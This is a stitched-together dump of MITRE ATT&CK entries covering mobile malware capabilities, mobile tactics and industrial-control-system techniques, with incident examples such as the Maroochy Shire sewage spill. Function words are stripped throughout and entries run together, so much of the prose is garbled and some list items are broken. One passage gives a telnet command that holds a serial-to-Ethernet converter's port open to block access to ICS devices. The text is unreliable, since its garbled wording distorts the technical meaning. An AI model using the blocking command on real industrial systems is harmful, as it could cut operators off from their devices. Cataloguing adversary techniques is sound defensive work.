device.(Citation: Lookout-Monokle) [SpyDealer](https://attack.mitre.org/software/S0324) record phone calls surrounding audio.(Citation: PaloAlto-SpyDealer) [SpyDealer](https://attack.mitre.org/software/S0324) harvests device phone number, IMEI, IMSI.(Citation: PaloAlto-SpyDealer) [CarbonSteal](https://attack.mitre.org/software/S0529) deleted log entries coming C2 sources.(Citation: Lookout Uyghur Campaign) [XLoader Android](https://attack.mitre.org/software/S0318) collects device’s IMSI ICCID.(Citation: TrendMicro-XLoader-FakeSpy) Contact list access uncommonly permission, users instructed extra scrutiny granting access contact list.  [Cerberus](https://attack.mitre.org/software/S0480) inject input grant additional permissions user interaction prevent application removal.(Citation: Threat Fabric Cerberus)(Citation: CheckPoint Cerberus)  [Tiktok Pro](https://attack.mitre.org/software/S0558) access device's contact list.(Citation: Zscaler TikTok Spyware)  [Stealth Mango](https://attack.mitre.org/software/S0328) perform GPS location tracking capturing coordinates SMS message received.(Citation: Lookout-StealthMango) Users wary granting applications dangerous privacy-intrusive permissions, access microphone audio output.  [TERRACOTTA](https://attack.mitre.org/software/S0545) send SMS messages.(Citation: WhiteOps TERRACOTTA) [Ginp](https://attack.mitre.org/software/S0423) obfuscates payload, code, strings.(Citation: ThreatFabric Ginp) [Asacub](https://attack.mitre.org/software/S0540) request device administrator permissions.(Citation: Securelist Asacub) [HummingBad](https://attack.mitre.org/software/S0322) create fraudulent statistics official Google Play Store.(Citation: ArsTechnica-HummingBad) Security updates patches vulnerabilities. [Stealth Mango](https://attack.mitre.org/software/S0328) delivered watering hole mimics third-party Android app store APKMonk. case, watering hole URL distributed Facebook Messenger.(Citation: Lookout-StealthMango) Application developers apply `FLAG_SECURE` property sensitive screens apps difficult screen contents captured.(Citation: Nightwatch screencap April 2016)  [DoubleAgent](https://attack.mitre.org/software/S0550) accessed common information.(Citation: Lookout Uyghur Campaign) [FakeSpy](https://attack.mitre.org/software/S0509) exfiltrates data requests.(Citation: Cybereason FakeSpy) [AndroRAT](https://attack.mitre.org/software/S0292) tracks device location.(Citation: Lookout-EnterpriseApps) [Tiktok Pro](https://attack.mitre.org/software/S0558) capture photos videos device’s camera.(Citation: Zscaler TikTok Spyware) Attestation detect unauthorized modifications devices. Mobile security software mitigation action.  [ViperRAT](https://attack.mitre.org/software/S0506) collect SMS messages.(Citation: Lookout ViperRAT) [Bread](https://attack.mitre.org/software/S0432) fake reviews ratings Play Store.(Citation: Google Bread)  [SilkBean](https://attack.mitre.org/software/S0549) retrieve files external storage collect browser data.(Citation: Lookout Uyghur Campaign)  [Exodus](https://attack.mitre.org/software/S0405) screenshots application foreground.(Citation: SWB Exodus March 2019)  [GoldenEagle](https://attack.mitre.org/software/S0551) retrieved .doc, .txt, .gif, .apk, .jpg, .png, .mp3, .db files external storage.(Citation: Lookout Uyghur Campaign) [Pallas](https://attack.mitre.org/software/S0399) exfiltrates data HTTP.(Citation: Lookout Dark Caracal Jan 2018) [Stealth Mango](https://attack.mitre.org/software/S0328) collected exfiltrated data device, including sensitive letters/documents, stored photos, stored audio files.(Citation: Lookout-StealthMango) EMM/MDM Android `DevicePolicyManager.setPermittedAccessibilityServices` method set explicit list applications allowed Android's accessibility features. [Stealth Mango](https://attack.mitre.org/software/S0328) uploads SMS messages.(Citation: Lookout-StealthMango) EMM/MDM Android `DevicePolicyManager.setPermittedAccessibilityServices` method whitelist applications allowed Android's accessibility features. [Exobot](https://attack.mitre.org/software/S0522) SOCKS proxy connection compromised device.(Citation: Threat Fabric Exobot)  [Exodus](https://attack.mitre.org/software/S0405) list installed applications.(Citation: SWB Exodus March 2019)  [INSOMNIA](https://attack.mitre.org/software/S0463) utilized malicious JavaScript iframes exploit WebKit running vulnerable iOS 12 devices.(Citation: Volexity Insomnia) [SpyDealer](https://attack.mitre.org/software/S0324) record video photos rear cameras.(Citation: PaloAlto-SpyDealer) [BusyGasper](https://attack.mitre.org/software/S0655) collect data messaging applications, including WhatsApp, Viber, Facebook.(Citation: SecureList BusyGasper) [EventBot](https://attack.mitre.org/software/S0478) registers `BOOT_COMPLETED` intent auto-start device boots.(Citation: Cybereason EventBot) [eSurv](https://attack.mitre.org/software/S0507)’s Android version distributed stages: dropper, stage payload, stage payload [Exodus](https://attack.mitre.org/software/S0405).(Citation: Lookout eSurv) [TrickMo](https://attack.mitre.org/software/S0427) obfuscated function, class, variable names, encrypts shared preferences Java’s `PBEWithMD5AndDES` algorithm.(Citation: SecurityIntelligence TrickMo) [Windshift](https://attack.mitre.org/groups/G0112) region-locked malicious applications Operation BULL campaign.(Citation: BlackBerry Bahamut) [Mandrake](https://attack.mitre.org/software/S0485) access SMS messages.(Citation: Bitdefender Mandrake) Attestation detect rooted devices. Mobile security software mitigation action. Attestation detect rooted devices. Android Verified Boot detect unauthorized modifications partition, lead execution flow hijacking.(Citation: Android-VerifiedBoot)  [NotCompatible](https://attack.mitre.org/software/S0299) capability exploit systems enterprise network.(Citation: Lookout-NotCompatible) [Windshift](https://attack.mitre.org/groups/G0112) included malware functionality capable downloading DEX files runtime Operation BULL.(Citation: BlackBerry Bahamut) [RedDrop](https://attack.mitre.org/software/S0326) captures live recordings device's surroundings.(Citation: Wandera-RedDrop) [Ginp](https://attack.mitre.org/software/S0423) download device’s contact list.(Citation: ThreatFabric Ginp) [FlexiSpy](https://attack.mitre.org/software/S0408) sophisticated surveillanceware iOS Android. Publicly-available, comprehensive analysis Android version.(Citation: FortiGuard-FlexiSpy)(Citation: CyberMerchants-FlexiSpy)

[FlexiSpy](https://attack.mitre.org/software/S0408) markets parental control employee monitoring application.(Citation: FlexiSpy-Website) [Xbot](https://attack.mitre.org/software/S0298) Android malware family observed 2016 targeting Android users Russia Australia. (Citation: PaloAlto-Xbot) tactics techniques representing MITRE ATT&CK Matrices Mobile. Matrices cover techniques involving device access network-based effects adversaries device access. Matrices platforms: Android, iOS. tactics technique representing MITRE ATT&CK Matrix Mobile. Matrix platforms: Android, iOS. adversary device.

The initial access tactic represents vectors adversaries gain initial foothold mobile device. adversary steal data.

Exfiltration refers techniques attributes result aid adversary removing files targeted mobile device.

In mobile environment, mobile devices frequently connected networks enterprise control cellular networks public Wi-Fi networks. Adversaries attempt evade detection communicating networks, non-Internet Protocol mechanisms Short Message Service (SMS). However, cellular networks data caps extra data charges increase potential adversarial communication detected.  adversary maintain foothold.

Persistence access, action, configuration change mobile device attacker persistent presence device. Attackers maintain access mobile devices interruptions device reboots factory data resets.  adversary gain higher-level permissions.

Privilege escalation includes techniques attacker level permissions mobile device. Attackers enter mobile device limited privileges required advantage device weakness privileges carry mission objectives. adversary communicate compromised devices control them.

The command control tactic represents adversaries communicate systems control target network. adversary establish command control levels covertness, depending configuration network topology. wide degree variation adversary network level, common factors differences command control. specific techniques documented methods, easy define protocols existing, legitimate protocols network services communication. 

The breakdown convey concept detecting intrusion command control protocols prior knowledge difficult proposition term. Adversaries' main constraints network-level defense avoidance testing deployment tools rapidly change protocols, awareness existing defensive technologies, access legitimate services that, appropriately, tools difficult distinguish benign traffic.

Additionally, mobile environment, mobile devices frequently connected networks enterprise control cellular networks public Wi-Fi networks. Adversaries attempt evade detection communicating networks, non-Internet Protocol mechanisms Short Message Service (SMS). However, cellular networks data caps extra data charges increase potential adversarial communication detected. adversary malicious code.

Execution consists techniques result adversary-controlled code running mobile device. Techniques malicious code paired techniques tactics achieve broader goals, exploring network stealing data. adversary manipulate, interrupt, destroy devices data.

The impact tactic consists techniques adversary execute mission objectives cleanly fit category Collection. Mission objectives vary based adversary's goals, examples include toll fraud, destruction device data, locking user device ransom paid. adversary steal account names, passwords, secrets enable access resources.

Credential access represents techniques adversaries access control passwords, tokens, cryptographic keys, values adversary gain unauthorized access resources. Credential access adversary assume identity account, account's permissions network, harder defenders detect adversary. sufficient access network, adversary create accounts environment. adversary gather data goal.

Collection consists techniques identify gather information, sensitive files, target network prior exfiltration. category covers locations network adversary exfiltrate. adversary environment.

Lateral movement consists techniques enable adversary access control remote systems network could, necessarily, include execution tools remote systems. lateral movement techniques adversary gather additional tools, remote access tool.  adversary avoid detected.

Defense evasion consists techniques adversary evade detection avoid defenses. actions variations techniques categories benefit subverting defense mitigation. Defense evasion considered set attributes adversary applies phases operation. adversary intercept manipulate network traffic device.

This category refers network-based techniques adversary fulfill objectives access mobile device itself. include techniques intercept manipulate network traffic mobile device. adversary figure environment.

Discovery consists techniques adversary gain knowledge characteristics mobile device networked systems. adversaries gain access system, orient control benefits operating current objective goals intrusion. operating provide capabilities aid post-compromise information-gathering phase. adversary control monitor device remote services.

This category refers techniques involving remote services, vendor-provided cloud services (e.g. Google Drive, Google Device, Apple iCloud), enterprise mobility management (EMM)/mobile device management (MDM) services adversary fulfill objectives access mobile device itself. Adversaries block command message reaching intended target prevent command execution. OT networks, command messages provide instructions control devices. blocked command message inhibit response functions correcting disruption unsafe condition. (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011)  (Citation: Electricity Sharing Analysis Center; SANS Industrial Control Systems March 2016) Adversaries disable services render services unavailable legitimate users. Stopping critical services inhibit response incident aid adversary's objectives damage environment. (Citation: Enterprise ATT&CK)  Services modification data stores running. Adversaries services conduct Data Destruction. (Citation: Enterprise ATT&CK) Adversaries modify parameters instruct industrial control devices. devices operate programs dictate perform actions based parameters. parameters determine extent action performed additional options. example, program control device dictating motor processes parameter defining total motor.      

An adversary modify parameters produce outcome intended operators. modifying process critical parameters, adversary [Impact](https://attack.mitre.org/tactics/TA0105) equipment control processes. Modified parameters dangerous, out-of-bounds, unexpected values typical operations. example, process time should, dictating unusually high, low, invalid parameter.

In Maroochy Shire attack, adversary gained remote access control altered data function occurred pumping stations occur occurred way. software program installed laptop developed changing configurations PDS computers. ultimately led 800,000 liters raw sewage spilled community.(Citation: Marshall Abrams July 2008) Adversaries modify tasking controller execution programs. adversary manipulate execution flow behavior controller. 

According 61131-3, association Task Program Organization Unit (POU) defines task association. (Citation: IEC February 2013) adversary modify associations create manipulate execution flow controller. Modification controller tasking accomplished Program Download addition types program modification online edit program append.

Tasks properties, interval, frequency priority meet requirements program execution. controller vendors implement tasks implicit, pre-defined properties properties formulated explicitly. adversary associate program tasks priority execute programs frequently. instance, ensure cyclic execution program Siemens controller, adversary add program task, Organization Block 1 (OB1). Adversaries seek capture radio frequency (RF) communication remote control reporting distributed environments. RF communication frequencies vary 3 kHz 300 GHz, commonly 300 MHz 6 GHz. (Citation: Candell, R., Hany, M., Lee, K. B., Liu,Y., Quimby, J., Remley, K. April 2018)  wavelength frequency signal affect signal propagates air, obstacles (e.g. walls trees) type radio required capture them. characteristics standardized protocol hardware signal captured. examples wireless protocols cyber-physical environments are: WirelessHART, Zigbee, WIA-FA, 700 MHz Public Safety Spectrum. 

Adversaries capture RF communications specialized hardware, software defined radio (SDR), handheld radio, radio demodulator tuned communication frequency. (Citation: Bastille April 2017) transmitted wireless medium captured in-transit sniffing device intended destination not. technique adversary communications encrypted. (Citation: Gallagher, S. April 2017) 

In 2017 Dallas Siren incident, suspected adversaries captured wireless command message broadcasts 700 MHz frequency regular system. messages replayed trigger alarm systems. (Citation: Gallagher, S. April 2017) Adversaries sustained permanent loss view ICS equipment require local, hands-on operator intervention; instance, restart manual operation. causing sustained reporting visibility loss, adversary effectively hide operations. loss view occur physical processes themselves. (Citation: Corero) (Citation: Michael J. Assante Robert M. Lee) (Citation: Tyson Macaulay) Adversaries activate firmware update mode devices prevent expected response functions engaging reaction emergency process malfunction. example, devices protection relays operation mode designed firmware installation. mode halt process monitoring functions firmware loaded. device left update mode inactive holding firmware it. entering leaving device mode, adversary deny usual functionalities. Adversaries manipulate physical process control industrial environment. Methods manipulating control include set values, tags, parameters. Adversaries manipulate control systems devices leverage own, communicate command physical control processes. duration manipulation temporary sustained, depending operator detection.   

Methods Manipulation Control include: 

* Man-in-the-middle  
* Spoof command message 
* Changing setpoints  

A Polish student remote controller device interface Lodz city tram Poland. (Citation: John 2017) (Citation: Shelley Smith February 2008) (Citation: Bruce Schneier January 2008) remote, student capture replay legitimate tram signals. consequence, trams derailed people injured emergency stops. (Citation: Shelley Smith February 2008) track controlling commands issued tram collisions, risk board nearby impact. (Citation: Bruce Schneier January 2008) Adversaries perform Denial-of-Service (DoS) attacks disrupt expected device functionality. Examples DoS attacks include overwhelming target device volume requests short time period sending target device request handle. Disrupting device temporarily render unresponsive, lasting reboot occur. state, devices unable send receive requests, perform expected response functions reaction events environment. 

Some ICS devices sensitive DoS events, unresponsive reaction simple ping sweep. Adversaries attempt execute Permanent Denial-of-Service (PDoS) devices, BrickerBot malware. (Citation: ICS-CERT April 2017) 

Adversaries exploit software vulnerability denial service advantage programming error program, service, operating software kernel execute adversary-controlled code. Vulnerabilities exist software denial service condition. 

Adversaries prior knowledge industrial protocols control devices environment [Remote Discovery](https://attack.mitre.org/techniques/T0888). examples adversaries remotely causing [Device Restart/Shutdown](https://attack.mitre.org/techniques/T0816) exploiting vulnerability induces uncontrolled resource consumption. (Citation: ICS-CERT August 2018) (Citation: Common Weakness Enumeration January 2019) (Citation: MITRE March 2018) 

In Maroochy Shire attack, adversary shut investigator network.(Citation: Marshall Abrams July 2008) Adversaries block access serial prevent instructions configurations reaching target devices. Serial Communication ports (COM) communication control devices. Devices receive command configuration messages serial COM. Devices serial send command reporting messages. Blocking device serial block command messages block reporting messages. 

A serial Ethernet converter connected serial facilitate communication serial Ethernet devices. approach blocking serial create hold TCP session Ethernet converter. serial Ethernet converter ports facilitate multiple communications. example, serial -- 1, 2 3 --, converter listening ports 20001, 20002, 20003. TCP/IP connection ports held open, port unavailable party. adversary achieve initiate TCP session serial Ethernet converter 10.0.0.1 Telnet serial port 1 command: telnet 10.0.0.1 20001. Adversaries perform role identification devices involved physical processes target control system. Control systems devices concert control physical process. device roles performs control process. collecting role-based data, adversary construct targeted attack.

For example, power generation plant unique devices monitors power output generator controls speed turbine. Examining devices roles adversary observe devices monitor control physical process. Understanding role target device inform adversary's decision action take, Impact influence disrupt integrity operations. Furthermore, adversary capture control protocol traffic. studying traffic, adversary determine devices outstations, masters. Understanding master devices role control processes enable Rogue Master Device Adversaries utilize command-line interfaces (CLIs) interact systems execute commands. CLIs provide interacting systems common feature types platforms devices control systems environments. (Citation: Enterprise ATT&CK January 2018) Adversaries CLIs install software, including malicious tools installed operation.

CLIs typically accessed locally, exposed services, SSH, Telnet, RDP.  Commands executed CLI execute current permissions level process running terminal emulator, command specifies change permissions context. controllers CLI interfaces management purposes. Adversaries collect tag values gain comprehensive understanding process environment. values inputs, memory locations, outputs process specific variables. (Citation: Dennis L. Sloatman September 2016) Tags identifiers operator convenience. 

Collecting tags valuable context environmental enables adversary map inputs, outputs, values control processes. Understanding collected inform adversary processes values track operation. Adversaries forcibly restart shutdown device ICS environment disrupt negatively impact physical processes. Methods device restart shutdown exist devices built-in, standard functionalities. functionalities executed interactive device interfaces, CLIs, network protocol commands.

Unexpected restart shutdown control devices prevent expected response functions happening critical states.

A device restart sign malicious device modifications, updates require shutdown effect. Adversaries rely targeted organizations user interaction execution malicious code. User interaction consist installing applications, email attachments, granting permissions documents. 

Adversaries embed malicious code visual basic code files Word Excel documents software installers. (Citation: Booz Allen Hamilton) Execution code requires user enable scripting write access document. Embedded code noticeable user trojanized software. (Citation: Daavid Hentunen, Antti Tikkanen June 2014) 

A Chinese spearphishing campaign running December 9, 2011 February 29, 2012 delivered malware spearphishing attachments required user action achieve execution. (Citation: CISA AA21-201A Pipeline Intrusion July 2021) Adversaries perform wireless compromise method gaining communications unauthorized access wireless network. Access wireless network gained compromise wireless device. (Citation: Alexander Bolshev, Gleb Cherbov July 2014) (Citation: Alexander Bolshev March 2014) Adversaries utilize radios wireless communication devices frequency wireless network. Wireless compromise initial access vector remote distance. 

In Maroochy Shire attack, adversary two-way radio communicate set frequencies Maroochy Shire's repeater stations.(Citation: Marshall Abrams July 2008)

A Polish student modified remote controller gain access control Lodz city tram Poland. (Citation: John 2017) (Citation: Shelley Smith February 2008) remote controller device allowed student interface trams network modify track settings override operator control. adversary accomplished aligning controller frequency amplitude control protocol signals. (Citation: Bruce Schneier January 2008) controller enabled initial access network, allowing capture replay tram signals. (Citation: John 2017) Adversaries change operating mode controller gain additional access engineering functions Program Download.   Programmable controllers typically modes operation control user program control access controllers API. Operating modes physically selected key switch controller selected calls controllers API. Operating modes mechanisms selected vary vendor product line. commonly implemented operating modes below:  

* Program - mode enabled devices program. program uploads downloads device engineering workstation. PLCs logic halted, outputs forced off. (Citation: N.A. October 2017)  
* - Execution devices program occurs mode. Input output (values, points, tags, elements, etc.) monitored programs logic. [Program Upload](https://attack.mitre.org/techniques/T0845) [Program Download](https://attack.mitre.org/techniques/T0843) disabled mode. (Citation: Omron) (Citation: Machine Systems 2007)  (Citation: N.A. October 2017) (Citation: PLCgurus 2021)   
* Remote - remote PLCs operation mode. (Citation: PLCgurus 2021)    
* - PLC program stopped, mode, outputs forced off. (Citation: Machine Systems 2007)   
* Reset - Conditions PLC reset original states. Warm resets retain memory cold resets reset I/O data registers. (Citation: Machine Systems 2007)   
* / Monitor mode - mode, I/O processed, mode monitoring, force set, resets, tuning debugging system. monitor mode trial initialization. (Citation: Omron) Adversaries target protection function alarms prevent notifying operators critical conditions. Alarm messages reporting adversaries. Disruption alarm imply disruption reporting whole.

A Secura presentation targeting OT notes dual fold goal adversaries attempting alarm suppression: prevent outgoing alarms raised prevent incoming alarms responded to. (Citation: Jos Wetzels, Marina Krotofil 2019) method suppression greatly depend type alarm question:  

* alarm raised protocol message 
* alarm signaled I/O 
* alarm bit set flag (and read) 

In ICS environments, adversary suppress contend multiple alarms alarm propagation achieve specific goal evade detection prevent intended responses occurring. (Citation: Jos Wetzels, Marina Krotofil 2019)  Methods suppression involve tampering altering device displays logs, modifying memory code fixed values, tampering assembly level instruction code.

In Maroochy Shire attack, adversary suppressed alarm reporting central computer.(Citation: Marshall Abrams July 2008) Adversaries gather PLCs controllers current operating mode. Operating modes dictate change maintenance functions manipulated controlled key switch PLC  run, prog [program], remote). Knowledge valuable adversary determine reprogram PLC. Operating modes mechanisms selected vary vendor product line. commonly implemented operating modes below:  

* Program - mode enabled devices program. program uploads downloads device engineering workstation. PLCs logic halted, outputs forced off. (Citation: N.A. October 2017)  
* - Execution devices program occurs mode. Input output (values, points, tags, elements, etc.) monitored programs logic. [Program Upload](https://attack.mitre.org/techniques/T0845) [Program Download](https://attack.mitre.org/techniques/T0843) disabled mode. (Citation: Omron) (Citation: Machine Systems 2007)  (Citation: N.A. October 2017) (Citation: PLCgurus 2021)   
* Remote - remote PLCs operation mode. (Citation: PLCgurus 2021)    
* - PLC program stopped, mode, outputs forced off. (Citation: Machine Systems 2007)   
* Reset - Conditions PLC reset original states. Warm resets retain memory cold resets reset I/O data registers. (Citation: Machine Systems 2007)   
* / Monitor mode - mode, I/O processed, mode monitoring, force set, resets, tuning debugging system. monitor mode trial initialization. (Citation: Omron) Adversaries compromise protective functions designed prevent effects faults abnormal conditions. result equipment damage, prolonged process disruptions hazards personnel. 

Many faults abnormal conditions process control happen human operator react to. Speed critical correcting conditions limit impacts Loss Control Property Damage. 

Adversaries target disable protective functions prerequisite subsequent attack execution future faults abnormal conditions unchecked. Detection Loss Protection operators result shutdown process strict policies protection systems. Loss Productivity Revenue meet technical goals adversaries seeking process disruptions. Adversaries gather physical process state. gain process trigger malicious actions. sources process vary as, OPC tags, historian data, specific PLC block information, network traffic. Adversaries scripting languages execute arbitrary code form pre-written script form user-supplied code interpreter. Scripting languages programming languages compiled languages, scripting languages interpreter, compiler. interpreters read compile source code executed, opposed compilers, compile code executable file. Scripting software developers code interpreter exists. way, distribute package, precompiling executables systems. Scripting languages, Python, interpreters shipped default Linux distributions. 

In addition tool developers administrators, scripting language interpreters abused adversary execute code target environment. nature scripting languages, weaponized code deployed target easily, leaves possibility on-the-fly scripting perform task. adversary attempt detailed remote systems peripherals, make/model, role, configuration. Adversaries Remote Discovery aid targeting shaping follow-on behaviors. example, systems operational role model dictate relevant target adversary's operational objectives. addition, systems configuration scope subsequent technique usage. 

Requests typically implemented automation management protocols automatically requested vendor software normal operation. tailor management actions, program download module firmware. adversary leverage issuing calls systems API. Adversaries attempt upload program PLC gather industrial process. Uploading program acquire study underlying logic. Methods program upload include vendor software, enables user upload read program running PLC. software upload target program workstation, jump box, interfacing device. Adversaries leverage weaknesses exploit internet-facing software initial access industrial network. Internet-facing software user applications, underlying networking implementations, assets operating system, weak defenses, etc. Targets technique intentionally exposed purpose remote management visibility.

An adversary seek target public-facing applications provide direct access ICS environment ability ICS network. Publicly exposed applications online tools scan internet ports services. Version exposed application provide adversaries ability target specific vulnerabilities. Exposed control protocol remote access ports Commonly Port adversaries. Adversaries target collect data repositories. include sensitive data specifications, schematics, diagrams control layouts, devices, processes. Examples repositories include reference databases local machines process environment, workstations databases corporate network ICS.(Citation: Cybersecurity & Infrastructure Security Agency March 2018)

Information collected systems provide adversary understanding operational environment, vendors used, processes, procedures ICS.

In campaign 2011 2013 ONG organizations, Chinese state-sponsored actors searched document repositories specific as, manuals, remote terminal unit (RTU) sites, personnel lists, documents included string SCAD*, user credentials, remote dial-up access information. (Citation: CISA AA21-201A Pipeline Intrusion July 2021) Adversaries target devices transient ICS networks external networks. Normally, transient assets brought environment authorized personnel remain environment permanent basis. (Citation: North American Electric Reliability Corporation June 2021) Transient assets commonly support management functions common systems remotely managed asset feasible, external connections remote access exist, 3rd party contractor/vendor access required. 

Adversaries advantage transient assets ways. instance, adversaries target transient asset connected external network leverage trusted access environment launch attack. advantage installed applications libraries legitimate end-users interact control devices. 

Transient assets, cases, deployed secure configuration leading weaknesses adversary propagate malicious executable code, e.g., transient asset infected malware connected ICS environment malware propagates systems. 

In Maroochy Shire attack, adversary utilized computer, stolen, proprietary engineering software communicate wastewater system.(Citation: Marshall Abrams July 2008) Adversaries manipulate I/O image PLCs prevent functioning expected. Methods I/O image manipulation include overriding I/O table direct memory manipulation override function testing PLC programs. (Citation: Dr. Kelvin T. Erickson December 2010) scan cycle, PLC reads status inputs stores image table. (Citation: Nanjundaiah, Vaidyanath) image table PLCs internal storage location values inputs/outputs scan stored executes user program. PLC solved entire logic program, updates output image table. contents output image table written output I/O Modules. 

One unique characteristics PLCs ability override status physical discrete input override logic driving physical output coil force output desired status. Network sniffing practice network interface monitor capture (Citation: Enterprise ATT&CK January 2018) destination information. 

An adversary attempt sniff traffic gain target. vary level importance. unimportant communications machines.  login information. User credentials unencrypted protocol, Telnet, captured network packet analysis. 

In addition, ARP Domain Service (DNS) poisoning capture credentials websites, proxies, internal systems redirecting traffic adversary. Adversaries deploy rootkits hide presence programs, files, network connections, services, drivers, components. Rootkits programs hide existence malware intercepting modifying operating-system API calls supply information. Rootkits rootkit-enabling functionality reside user kernel level operating system, lower. (Citation: Enterprise ATT&CK January 2018)   

Firmware rootkits affect operating yield control system. firmware rootkits developed main processing board, developed I/O attached asset. Compromise firmware modification process variables functions module engages in. result commands disregarded false fed main device. tampering device processes, adversary inhibit expected response functions enable [Impact](https://attack.mitre.org/tactics/TA0105). Adversaries automate collection industrial environment tools scripts. automated collection leverage native control protocols tools control systems environment. example, OPC protocol enumerate gather information. Access interface native protocols collection enumeration attached, communicating servers devices. Adversaries block prevent reporting message reaching intended target. control systems, reporting messages telemetry data I/O values) pertaining current equipment industrial process. blocking reporting messages, adversary hide actions operator.

Blocking reporting messages control systems manage physical processes contribute impact, causing inhibition response function. control respond proper timely manner event, dangerous fault, reporting message blocked. (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011)  (Citation: Electricity Sharing Analysis Center; SANS Industrial Control Systems March 2016) Adversaries send unauthorized command messages instruct control assets perform actions intended functionality, logical preconditions trigger expected function. Command messages ICS networks direct instructions control systems devices. adversary send unauthorized command message control system, instruct control systems device perform action normal bounds device's actions. adversary instruct control systems device perform action [Impact](https://attack.mitre.org/tactics/TA0105). (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011)

In Maroochy Shire attack, adversary dedicated analog two-way radio send false data instructions pumping stations central computer.(Citation: Marshall Abrams July 2008)

In Dallas Siren incident, adversaries send command messages activate tornado alarm systems city impending tornado disaster. (Citation: Zack Whittaker April 2017) (Citation: Benjamin Freed March 2019) Adversaries perform data destruction operation. adversary drop create malware, tools, non-native files target accomplish this, leaving traces malicious activities. non-native files data removed intrusion maintain footprint standard post-intrusion cleanup process. (Citation: Enterprise ATT&CK January 2018)

Data destruction render operator interfaces unable respond disrupt response functions occurring expected. adversary destroy data backups vital recovery incident.

Standard file deletion commands operating device interfaces perform cleanup, adversaries tools well. examples Windows Sysinternals SDelete Active@ Killdisk. Adversaries attempt manipulate reported operators controllers. manipulation short term sustained. time process reported. (Citation: Corero) (Citation: Michael J. Assante Robert M. Lee) (Citation: Tyson Macaulay) 

Operators fooled harmful loss view situation. manipulated view systems, operators issue inappropriate control sequences introduce faults catastrophic failures system. Business analysis systems inaccurate data leading bad management decisions. Adversaries compromise gain control data historian gain foothold control environment. Access data historian learn stored database archival analysis control system. dual-homed data historian provide adversaries interface environment OT environment. 

Dragos released updated analysis CrashOverride outlines attack ICS network breach payload delivery execution.  (Citation: Industroyer - Dragos - 201810) report summarized CrashOverride represents application malware, relied standard intrusion techniques. particular, artifacts include references Windows Server 2003 host, SQL Server. ICS environment, database server data historian. Dragos device role "expected extensive connections" ICS environment. Adversary activity leveraged database capabilities perform reconnaissance, including directory queries network connectivity checks.

Permissions Required: Administrator

Contributors: Joe Slowik - Dragos Network Service Scanning process discovering services networked systems.  achieved technique called port scanning probing.  Port scanning interacts TCP/IP ports target determine ports open, closed, filtered firewall.  reveal service running port, common services [https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml specific port numbers], type service assumed.  in-depth testing includes interaction actual service determine service type specific version.  most-popular tools Network Service Scanning [https://nmap.org/ Nmap].

An adversary attempt gain target device role network Network Service Scanning techniques, port scanning.  Network Service Scanning determining potential vulnerabilities services target devices.  Network Service Scanning closely tied .

Scanning ports noisy network. attacks, adversaries probe specific ports custom tools. Triton PLC-Blaster attacks. Adversaries attempt remove indicators presence effort cover tracks. adversary feel detection imminent, overwrite, delete, cover device. Adversaries seek capture process values inputs outputs PLC. scan cycle, PLC reads status inputs stores image table. (Citation: Nanjundaiah, Vaidyanath) image table PLCs internal storage location values inputs/outputs scan stored executes user program. PLC solved entire logic program, updates output image table. contents output image table written output I/O Modules.

The Input Output Image tables I/O Image PLC. image user program interacting physical I/O. (Citation: Spenneberg, Ralf 2016) 

Adversaries collect I/O Image PLC utilizing devices [Native API](https://attack.mitre.org/techniques/T0834) access memory regions directly. collection PLCs I/O replace values inform future stages attack. Adversaries denial view attempt disrupt prevent operator oversight status ICS environment. manifest temporary communication failure device control source, interface recovers interference ceases. (Citation: Corero) (Citation: Michael J. Assante Robert M. Lee) (Citation: Tyson Macaulay) 

An adversary attempt deny operator visibility preventing receiving status reporting messages. Denying view temporarily block prevent operators noticing change anomalous behavior. environment's data processes operational, functioning unintended adversarial manner. 

In Maroochy Shire attack, adversary temporarily shut investigator network, preventing viewing system.(Citation: Marshall Abrams July 2008) Adversaries attempt leverage Application Program Interfaces (APIs) communication control software hardware. Specific functionality coded APIs called software engage specific functions device software. Adversaries perform supply chain compromise gain control systems environment access infected products, software, workflows. Supply chain compromise manipulation products, devices software, delivery mechanisms receipt consumer. Adversary compromise products mechanisms goal data compromise, infected products introduced target environment. 

Supply chain compromise occur stages supply chain, manipulation development tools environments manipulation developed products tools distribution mechanisms. involve compromise replacement legitimate software patches, party vendor websites. Targeting supply chain compromise attempts infiltrate environments specific audience. control systems environments assets OT networks, supply chain compromise environment enable access OT environment.   

Counterfeit devices introduced global supply chain posing safety cyber risks asset owners operators. devices meet safety, engineering manufacturing requirements regulatory bodies feature tagging indicating conformance industry standards. lack adherence standards lesser quality, counterfeit products pose safety operational risk. (Citation: Control Global 2019) 

Yokogawa identified instances customers received counterfeit differential pressure transmitters Yokogawa logo. counterfeit transmitters indistinguishable semblance functionality interface mimics genuine product. (Citation: Control Global 2019) 

F-Secure Labs analyzed approach adversary compromise victim systems Havex. (Citation: Daavid Hentunen, Antti Tikkanen June 2014) adversary planted trojanized software installers legitimate ICS/SCADA vendor websites. downloaded, software infected host Remote Access Trojan (RAT). Adversaries perform serial connection enumeration gather situational awareness gaining access devices OT network. Control systems devices communicate types serial communication mediums. serial communications facilitate informational communication, commands.  Serial Connection Enumeration differs I/O Module Discovery, I/O modules auxiliary systems main system, devices connected serial connection discrete systems.

While OT networks tandem, exact structure OT network discernible network alone. gaining access device OT network, adversary enumerate serial connections. perspective, adversary specific physical devices compromised device connected to. adversary situational awareness influence actions adversary attack. Adversaries compromise safety functions designed maintain safe operation process unacceptable dangerous conditions occur. Safety systems composed elements control systems sole purpose ensuring process fails predetermined safe manner. 

Many unsafe conditions process control happen human operator react to. Speed critical correcting conditions limit impacts Loss Control Property Damage. 

Adversaries target disable safety functions prerequisite subsequent attack execution future unsafe conditionals unchecked. Detection Loss Safety operators result shutdown process strict policies safety systems. Loss Productivity Revenue meet technical goals adversaries seeking process disruptions. Adversaries loss productivity revenue disruption damage availability integrity control operations, devices, processes. technique manifest direct ICS-targeting attack tangentially, IT-targeting attack non-segregated environments. 

In operations services brought halt, loss productivity eventually impact end-users consumers products services. disrupted supply-chain result supply shortages increased prices, consequences. 

A ransomware attack Australian beverage company shutdown manufacturing sites, including precautionary halts protect key systems. (Citation: Paganini, Pierluigi June 2020) company announced potential temporary shortages products attack. (Citation: Paganini, Pierluigi June 2020) (Citation: Lion Corporation June 2020) 

